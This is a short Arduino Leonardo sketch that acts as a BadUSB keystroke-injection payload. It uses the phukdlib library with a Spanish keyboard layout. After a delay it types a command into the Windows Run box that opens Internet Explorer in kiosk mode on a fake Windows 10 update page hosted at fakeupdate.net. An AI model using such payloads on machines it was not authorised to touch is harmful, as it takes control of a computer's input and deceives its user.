#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("iexplore -k http://fakeupdate.net/win10u/index.html");
  while(1);
}
